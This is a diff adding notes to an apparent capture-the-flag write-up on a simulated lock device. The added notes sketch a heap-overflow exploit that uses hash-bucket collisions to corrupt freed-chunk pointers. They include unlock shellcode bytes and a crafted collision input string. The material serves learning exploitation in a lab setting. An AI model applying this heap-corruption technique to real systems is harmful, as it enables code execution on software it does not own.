@@ -150,3 +150,14 @@ Executing the `walk` function after `new bob 123`:
  {52e2} [ 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 ]
 @533c [freed] [p 52dc] [n 5000] [s 7cbe]
 ```
+
+Idea: we can overflow a bucket by hashing > 5 items to the same bucket. If we overflow the last bucket we can overwrite the free chunk's `prev` and/or `next` pointer. Then the next time a `malloc` is called we might be able to get it to return a place in memory that contains code that gets executed, which we then overwrite without our own assembled unlock code:
+
+```
+call #0x7F
+b0127f00
+```
+
+To get more calls to `malloc` we've got to fill up the hash table enough that it rehashes the table.
+
+`new abab 0;new bbabbbabbbaccac 1;new bbabbbabbbaddbd 2;new bbabbbabbbaeece 3;new bbabbbabbbaffdf 4;new bbabbbabbbaggeg 5;new bbabbbabbbahhfh 6`
